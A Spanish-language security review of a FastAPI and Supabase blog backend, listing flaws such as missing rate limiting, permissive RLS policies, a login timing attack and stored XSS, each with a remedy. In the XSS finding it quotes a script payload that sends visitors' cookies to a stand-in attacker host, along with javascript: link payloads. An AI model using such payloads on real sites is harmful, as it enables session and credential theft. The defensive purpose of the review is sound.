# Análisis de Seguridad

Revisión completa de los documentos HU-001 a HU-008 y COMPLETITUD-Y-DESPLIEGUE.

---

## Resumen Ejecutivo

El diseño base es sólido para un MVP: bcrypt para passwords, JWT stateless, mensajes de error genéricos, validación por rol en cada endpoint, y aislamiento por `project_id`. Sin embargo, hay **2 vulnerabilidades críticas** y **4 de severidad alta** que deben corregirse antes de producción.

---

## Vulnerabilidades por Severidad

### CRITICA — Resolver antes de escribir la primera línea de código

---

#### SEC-001: Sin rate limiting en `/auth/login` (Brute Force)

**Problema:** El endpoint `POST /auth/login` no tiene ningún límite de intentos. Un atacante puede probar millones de combinaciones email/password sin restricción.

**Impacto:** Compromiso de cualquier cuenta de admin si usa un password débil.

**Solución: `slowapi` como middleware de rate limiting**

```python
# requirements.txt — agregar:
slowapi>=0.1.9

# app/main.py
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# app/auth/router.py
from app.main import limiter
from fastapi import Request

@router.post("/login", response_model=TokenResponse)
@limiter.limit("5/minute")  # máx 5 intentos por minuto por IP
def login(request: Request, body: LoginRequest):
    ...
```

**Nota adicional:** En Railway, si hay un proxy/load balancer delante, verificar que el header `X-Forwarded-For` esté bien configurado para que `get_remote_address` obtenga la IP real del cliente.

---

#### SEC-002: RLS en Supabase es `USING (true)` — no hay protección real en DB

**Problema:** En HU-001, las políticas RLS definidas son:
```sql
CREATE POLICY "admins_service_only" ON admins FOR ALL USING (true);
CREATE POLICY "sections_service_write" ON sections FOR ALL USING (true);
CREATE POLICY "blocks_service_write" ON blocks FOR ALL USING (true);
```

Esto equivale a no tener RLS. Si en algún momento se accede a Supabase con un rol diferente a `service_role` (desde el Dashboard, otro cliente, un bug, o el futuro frontend con anon key), no hay ninguna restricción real en la base de datos.

Toda la seguridad depende de que el código FastAPI nunca tenga un bug. Eso es una superficie de ataque frágil.

**Solución: Políticas RLS reales por `project_id`**

```sql
-- Para bloques: solo lectura de los propios, escritura via service_role
-- La service_role bypassa RLS automáticamente, estas políticas aplican a anon/authenticated

-- Lectura pública de bloques visibles (para el frontend sin auth)
CREATE POLICY "blocks_public_read" ON blocks
    FOR SELECT USING (visible = true);

-- Escritura: solo desde service_role (FastAPI). Para anon/authenticated, denegado por defecto.
-- No necesitas política de escritura pública — el silencio es denegación.

-- Lo mismo para sections:
CREATE POLICY "sections_public_read" ON sections
    FOR SELECT USING (true);

-- admins: solo service_role accede. Ninguna política pública = denegado por defecto.
-- (No crear políticas de SELECT/INSERT/etc. para anon en admins)
```

> La `service_role` key siempre bypassa RLS, así que FastAPI sigue funcionando igual. Lo que cambia es que si alguien intenta acceder a Supabase con la `anon` key, no ve nada sensible.

**Regla de oro:** Nunca exponer la `service_role` key en el frontend. Usar siempre la `anon` key en el frontend para operaciones públicas, y dejar que FastAPI use la `service_role` para operaciones autenticadas.

---

### ALTA — Resolver antes del primer despliegue a producción

---

#### SEC-003: Timing Attack — enumeración de emails en login

**Problema:** En `app/auth/router.py` (HU-002):

```python
if not result.data:
    raise HTTPException(status_code=401, ...)  # retorna en ~5ms (sin bcrypt)

# Solo si el email existe:
if not pwd_context.verify(body.password, admin["hashed_password"]):
    raise HTTPException(status_code=401, ...)  # retorna en ~100ms (bcrypt)
```

Un atacante puede medir el tiempo de respuesta para saber si un email está registrado: respuesta rápida = email no existe, respuesta lenta = email existe pero password incorrecto. Esto permite enumerar todos los admins del sistema.

**Solución:** Siempre ejecutar la verificación bcrypt, incluso cuando el email no existe:

```python
DUMMY_HASH = "$2b$12$dummy.hash.to.prevent.timing.attacks.xxxxxxxxxxxxxxxxxx"

@router.post("/login", response_model=TokenResponse)
@limiter.limit("5/minute")
def login(request: Request, body: LoginRequest):
    result = supabase.table("admins").select("id, project_id, role, hashed_password") \
        .eq("email", body.email).execute()

    if not result.data:
        # Ejecutar bcrypt igualmente para igualar el tiempo de respuesta
        pwd_context.verify(body.password, DUMMY_HASH)
        raise HTTPException(status_code=401, detail="Credenciales inválidas")

    admin = result.data[0]
    if not pwd_context.verify(body.password, admin["hashed_password"]):
        raise HTTPException(status_code=401, detail="Credenciales inválidas")
    ...
```

**Nota adicional:** El query en la solución original hace `select("*")` que incluye `hashed_password` en memoria. Cambiarlo a seleccionar solo los campos necesarios: `id, project_id, role, hashed_password`.

---

#### SEC-004: Sin revocación de tokens — admins eliminados siguen activos hasta 24h

**Problema:** Los JWTs son stateless. Si un admin es eliminado (`DELETE /admins/{project_id}/{admin_id}`), su token sigue siendo válido hasta que expire (hasta 24 horas). Lo mismo aplica si se cambia el rol de un usuario: el JWT antiguo sigue teniendo el rol anterior.

**Escenarios de riesgo:**
- Owner despide a editor y lo elimina → el ex-editor sigue pudiendo crear/editar bloques por hasta 24h
- Owner degrada a editor a viewer → el editor sigue teniendo permisos de editor por hasta 24h

**Solución A (recomendada para MVP): Reducir la expiración del JWT**

Cambiar `JWT_EXPIRE_HOURS` de 24h a 1h. El frontend debe implementar refresh silencioso (re-login automático antes de que expire). Reduce la ventana de abuso de 24h a 1h.

```
JWT_EXPIRE_HOURS=1
```

**Solución B (más completa): Denylist de tokens en Redis/Supabase**

```python
# Al eliminar un admin, registrar su token en una denylist
# Al validar JWT, verificar que no esté en la denylist

# Tabla adicional en Supabase:
CREATE TABLE token_denylist (
    jti UUID PRIMARY KEY,
    expires_at TIMESTAMPTZ NOT NULL
);

# En get_current_user:
jti = payload.get("jti")
denied = supabase.table("token_denylist").select("jti").eq("jti", jti).execute()
if denied.data:
    raise HTTPException(status_code=401, detail="Token revocado")
```

> Para el MVP, la Solución A es suficiente. La Solución B se recomienda si en el futuro los proyectos tienen muchos editors con acceso sensible.

---

#### SEC-005: XSS Almacenado vía bloques tipo `text` (Markdown)

**Problema:** El bloque de tipo `text` acepta contenido markdown en el campo `body` sin ninguna sanitización:

```python
class TextContent(BaseModel):
    body: str  # sin restricciones
```

Si el frontend renderiza el markdown como HTML (con librerías como `react-markdown`, `marked`, etc.), un `editor` con credenciales válidas puede almacenar JavaScript malicioso en el `body`:

```markdown
[click here](javascript:alert(document.cookie))
<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

El XSS se ejecuta en el navegador de cualquier visitante de la página pública. Dado que el panel admin es el objetivo principal, esto podría comprometer las credenciales del owner.

**Solución en el Backend:** Sanitizar el `body` antes de guardarlo, rechazando HTML y JavaScript:

```python
import re

class TextContent(BaseModel):
    body: str

    @field_validator("body")
    @classmethod
    def no_html_scripts(cls, v: str) -> str:
        # Rechazar cualquier tag HTML o javascript: links
        if re.search(r'<[^>]+>|javascript:', v, re.IGNORECASE):
            raise ValueError("El contenido no puede incluir HTML o scripts")
        return v
```

**Solución en el Frontend (obligatoria en cualquier caso):** Usar la opción `disallowedElements` de `react-markdown` o `DOMPurify` para sanitizar el HTML renderizado. La defensa en backend es complementaria, no sustituta.

---

#### SEC-006: FastAPI expone `/docs` y `/redoc` en producción

**Problema:** FastAPI habilita la documentación interactiva de Swagger (`/docs`) y ReDoc (`/redoc`) por defecto en todos los entornos. En producción, esto:

1. Expone la estructura completa de la API a cualquier visitante
2. Permite ejecutar endpoints directamente desde el navegador
3. Revela schemas de datos, incluyendo campos internos

**Solución:**

```python
# app/config.py — agregar:
environment: str = "development"

# app/main.py
from app.config import settings

app = FastAPI(
    title="Blogs Backend API",
    docs_url="/docs" if settings.environment != "production" else None,
    redoc_url="/redoc" if settings.environment != "production" else None,
    openapi_url="/openapi.json" if settings.environment != "production" else None,
)
```

```
# .env en producción (Railway):
ENVIRONMENT=production
```

---

### MEDIA — Resolver antes de abrir el sistema a múltiples usuarios

---

#### SEC-007: Sin validación de longitud en `content_json`

**Problema:** No hay límite de tamaño en los campos de `content_json`. Un editor puede enviar payloads masivos (megabytes de texto en un bloque `text`), inflando la base de datos indefinidamente o causando timeouts.

**Solución:**

```python
class TextContent(BaseModel):
    body: str

    @field_validator("body")
    @classmethod
    def max_length(cls, v: str) -> str:
        if len(v) > 50_000:  # 50KB por bloque
            raise ValueError("El contenido excede el tamaño máximo permitido")
        return v
```

Aplicar validadores de longitud a todos los campos de texto en `blocks/validator.py` y `sections/validator.py`.

---

#### SEC-008: Sin validación de formato URL en bloques `image`, `cta`, `document`

**Problema:** Los campos `url` en los bloques que referencian URLs externas no son validados como URLs reales. Se puede guardar cualquier string, incluyendo `javascript:alert(1)` o rutas locales.

**Solución:**

```python
from pydantic import HttpUrl

class ImageContent(BaseModel):
    url: HttpUrl  # Pydantic valida que sea http:// o https://
    alt: str = ""

class CtaContent(BaseModel):
    label: str
    url: HttpUrl

class DocumentContent(BaseModel):
    title: str
    url: HttpUrl
```

`HttpUrl` de Pydantic rechaza automáticamente `javascript:`, `file://`, y cualquier string que no sea una URL válida con esquema `http` o `https`.

---

#### SEC-009: Sin validación de contraseña al crear admins

**Problema:** `POST /admins/{project_id}` acepta cualquier string como `password`, incluyendo `"a"` o `"123"`.

**Solución:**

```python
class AdminCreate(BaseModel):
    email: EmailStr
    password: str
    role: str

    @field_validator("password")
    @classmethod
    def password_strength(cls, v: str) -> str:
        if len(v) < 8:
            raise ValueError("La contraseña debe tener al menos 8 caracteres")
        if not re.search(r'[A-Za-z]', v) or not re.search(r'[0-9]', v):
            raise ValueError("La contraseña debe contener letras y números")
        return v
```

---

#### SEC-010: CORS demasiado permisivo incluso en producción

**Problema:** El documento de despliegue configura `allow_methods=["*"]` y `allow_headers=["*"]` en producción. Esto incluye métodos HTTP no usados por la API (como `TRACE`, `OPTIONS` en exceso) y headers arbitrarios.

**Solución:**

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://johannesta.com",
        "https://admin.johannesta.com",
    ],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],  # solo los necesarios
    allow_headers=["Authorization", "Content-Type"],  # solo los necesarios
)
```

---

#### SEC-011: Ausencia de `.gitignore` en la estructura del proyecto

**Problema:** La estructura de archivos documentada no incluye `.gitignore`. Si se hace `git add .` sin este archivo, el `.env` con las claves de Supabase y el JWT secret podría subirse al repositorio.

**Solución:** Incluir `.gitignore` desde el primer commit:

```gitignore
# Entorno
.env
.env.local
.env.*.local

# Python
__pycache__/
*.py[cod]
*.pyo
.venv/
venv/
*.egg-info/
dist/
build/

# IDE
.vscode/
.idea/
*.swp

# OS
.DS_Store
Thumbs.db
```

---

### BAJA — Buenas prácticas para el futuro

---

#### SEC-012: `python-jose` tiene historial de vulnerabilidades

`python-jose` tiene CVEs reportados en versiones anteriores relacionados con confusión de algoritmos JWT (algorithm confusion attacks). Para mayor seguridad, considerar migrar a `PyJWT` que tiene mantenimiento más activo:

```python
# Con PyJWT:
import jwt as pyjwt

token = pyjwt.encode(payload, settings.jwt_secret, algorithm="HS256")
payload = pyjwt.decode(token, settings.jwt_secret, algorithms=["HS256"])
```

El cambio de librería es transparente para el resto del código.

---

#### SEC-013: `GET /health` expone el endpoint público sin información

El endpoint `/health` actual retorna `{"status": "ok"}`. Asegurarse de que nunca retorne información de versión, entorno, o configuración:

```python
# Bien (lo que está documentado)
@app.get("/health")
def health():
    return {"status": "ok"}

# Mal — nunca hacer esto
@app.get("/health")
def health():
    return {"status": "ok", "version": "1.0", "env": settings.environment, "db": settings.supabase_url}
```

---

## Resumen de Acciones Requeridas

### Antes de escribir código
- [ ] **SEC-002:** Redefinir políticas RLS reales en HU-001 (no `USING (true)`)
- [ ] **SEC-011:** Crear `.gitignore` antes del primer commit

### Antes del primer despliegue a producción
- [ ] **SEC-001:** Implementar rate limiting en `/auth/login` con `slowapi`
- [ ] **SEC-003:** Corregir timing attack en login (dummy hash + select campos específicos)
- [ ] **SEC-004:** Reducir `JWT_EXPIRE_HOURS` a 1h (o implementar denylist)
- [ ] **SEC-005:** Sanitizar campo `body` en bloque `text` (rechazar HTML/scripts)
- [ ] **SEC-006:** Deshabilitar `/docs` y `/redoc` en producción
- [ ] **SEC-008:** Usar `HttpUrl` de Pydantic para validar URLs

### Antes de abrir a múltiples usuarios
- [ ] **SEC-007:** Agregar límites de longitud en `content_json`
- [ ] **SEC-009:** Validar fortaleza de password en `POST /admins`
- [ ] **SEC-010:** Restringir `allow_methods` y `allow_headers` en CORS

### Mejoras futuras
- [ ] **SEC-012:** Migrar de `python-jose` a `PyJWT`
- [ ] **SEC-004 (B):** Implementar denylist de tokens si el sistema escala

---

## Lo que el diseño SÍ hace bien

- Mensajes de error genéricos en login (no revelan si email existe o no — aunque el timing sí lo hace, ver SEC-003)
- bcrypt para hashing de passwords (costo computacional correcto)
- JWT con expiración explícita (no tokens indefinidos)
- `project_id` en el JWT validado contra la URL en cada endpoint protegido
- Mensajes de 403 vs 401 diferenciados correctamente
- Validación de tipos de bloque con lista blanca (`VALID_TYPES = {"text", "image", ...}`)
- `hashed_password` nunca incluido en `AdminResponse` (schema separado para respuesta)
- HTTPS gestionado por Railway en producción (no en texto plano)
- `JWT_SECRET` generado con `openssl rand -hex 32` (entropía suficiente)
